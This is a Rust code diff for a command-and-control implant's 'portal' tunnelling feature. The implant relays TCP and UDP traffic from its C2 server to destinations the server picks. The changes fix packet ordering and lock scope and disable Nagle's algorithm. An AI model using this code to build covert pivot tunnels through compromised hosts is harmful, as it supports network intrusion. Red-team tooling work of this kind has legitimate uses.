@@ -30,12 +30,6 @@ pub async fn run_create_portal<T: Transport + 'static>(
     }
 
     // 3. Start transport stream
-    // Transport needs to be updated to accept `outbound_rx` (requests to C2) and `inbound_tx` (responses from C2)
-    // Currently Transport::create_portal takes (rx, tx) where rx is Requests and tx is Responses.
-    // Wait, grpc.rs create_portal takes `rx` (Requests) and `_tx` (Responses).
-    // I need to update Transport trait and implementation first.
-
-    // Assuming Transport is updated:
     let transport_handle = tokio::spawn(async move {
         if let Err(e) = transport.create_portal(outbound_rx, inbound_tx).await {
             #[cfg(debug_assertions)]
@@ -44,7 +38,6 @@ pub async fn run_create_portal<T: Transport + 'static>(
     });
 
     // 4. Run loop
-    // inbound_rx gives us Responses from C2
     let stream = tokio_stream::wrappers::ReceiverStream::new(inbound_rx);
     let result = run_portal_loop(stream, outbound_tx, task_id).await;
 
@@ -72,27 +65,36 @@ where
             match payload_enum {
                 PortalPayloadEnum::Tcp(tcp_msg) => {
                     let src_id = tcp_msg.src_id.clone();
-                    let mut map = connections.lock().unwrap();
 
-                    let tx = if let Some(tx) = map.get(&src_id) {
-                        if tx.is_closed() {
-                            None
+                    // We scope the lock to release it before the await
+                    let tx = {
+                        let mut map = connections.lock().unwrap();
+                        if let Some(tx) = map.get(&src_id) {
+                            if tx.is_closed() {
+                                None
+                            } else {
+                                Some(tx.clone())
+                            }
                         } else {
-                            Some(tx.clone())
+                            None
                         }
-                    } else {
-                        None
                     };
 
                     if let Some(tx) = tx {
                         if !tcp_msg.data.is_empty() {
-                            tokio::spawn(async move {
-                                let _ = tx.send(tcp_msg.data).await;
-                            });
+                            // CRITICAL FIX: Do NOT spawn here.
+                            // We must await directly to preserve packet ordering (FIFO).
+                            // If we spawn, Packet B might arrive at the socket before Packet A.
+                            let _ = tx.send(tcp_msg.data).await;
                         }
                     } else {
                         let (tx, rx) = tokio::sync::mpsc::channel(100);
-                        map.insert(src_id.clone(), tx.clone());
+
+                        // Re-lock to insert
+                        connections
+                            .lock()
+                            .unwrap()
+                            .insert(src_id.clone(), tx.clone());
 
                         let map_clone = connections.clone();
                         let outbound_tx_clone = outbound_tx.clone();
@@ -100,13 +102,7 @@ where
                         let dst_port = tcp_msg.dst_port;
                         let initial_data = tcp_msg.data;
 
-                        if !initial_data.is_empty() {
-                            let tx_inner = tx.clone();
-                            tokio::spawn(async move {
-                                let _ = tx_inner.send(initial_data).await;
-                            });
-                        }
-
+                        // Spawn the connection handler
                         tokio::spawn(async move {
                             handle_tcp_connection(
                                 rx,
@@ -119,44 +115,46 @@ where
                             )
                             .await;
                         });
+
+                        // CRITICAL FIX: Send initial data immediately and ordered
+                        if !initial_data.is_empty() {
+                            let _ = tx.send(initial_data).await;
+                        }
                     }
                 }
                 PortalPayloadEnum::Udp(udp_msg) => {
                     let src_id = udp_msg.src_id.clone();
-                    let mut map = connections.lock().unwrap();
 
-                    let tx = if let Some(tx) = map.get(&src_id) {
-                        if tx.is_closed() {
-                            None
+                    let tx = {
+                        let mut map = connections.lock().unwrap();
+                        if let Some(tx) = map.get(&src_id) {
+                            if tx.is_closed() {
+                                None
+                            } else {
+                                Some(tx.clone())
+                            }
                         } else {
-                            Some(tx.clone())
+                            None
                         }
-                    } else {
-                        None
                     };
 
                     if let Some(tx) = tx {
                         if !udp_msg.data.is_empty() {
-                            tokio::spawn(async move {
-                                let _ = tx.send(udp_msg.data).await;
-                            });
+                            // Keep UDP ordered too, just in case
+                            let _ = tx.send(udp_msg.data).await;
                         }
                     } else {
                         let (tx, rx) = tokio::sync::mpsc::channel(100);
-                        map.insert(src_id.clone(), tx.clone());
+                        connections
+                            .lock()
+                            .unwrap()
+                            .insert(src_id.clone(), tx.clone());
 
                         let map_clone = connections.clone();
                         let outbound_tx_clone = outbound_tx.clone();
                         let dst_addr = udp_msg.dst_addr;
                         let dst_port = udp_msg.dst_port;
                         let initial_data = udp_msg.data;
-
-                        if !initial_data.is_empty() {
-                            let tx_inner = tx.clone();
-                            tokio::spawn(async move {
-                                let _ = tx_inner.send(initial_data).await;
-                            });
-                        }
 
                         tokio::spawn(async move {
                             handle_udp_connection(
@@ -170,6 +168,10 @@ where
                             )
                             .await;
                         });
+
+                        if !initial_data.is_empty() {
+                            let _ = tx.send(initial_data).await;
+                        }
                     }
                 }
                 PortalPayloadEnum::Bytes(bytes_msg) => {
@@ -202,6 +204,13 @@ async fn handle_tcp_connection(
     let addr = format!("{}:{}", dst_addr, dst_port);
     match tokio::net::TcpStream::connect(&addr).await {
         Ok(stream) => {
+            // CRITICAL FIX: Disable Nagle's algorithm.
+            // This prevents the OS from buffering tiny TLS ChangeCipherSpec packets.
+            if let Err(e) = stream.set_nodelay(true) {
+                #[cfg(debug_assertions)]
+                log::warn!("Failed to set nodelay: {}", e);
+            }
+
             let (mut reader, mut writer) = stream.into_split();
             let mut buf = [0u8; 4096];
 
@@ -232,6 +241,7 @@ async fn handle_tcp_connection(
                     res = rx.recv() => {
                         match res {
                             Some(data) => {
+                                // write_all ensures short writes are handled automatically
                                 if writer.write_all(&data).await.is_err() {
                                     break;
                                 }
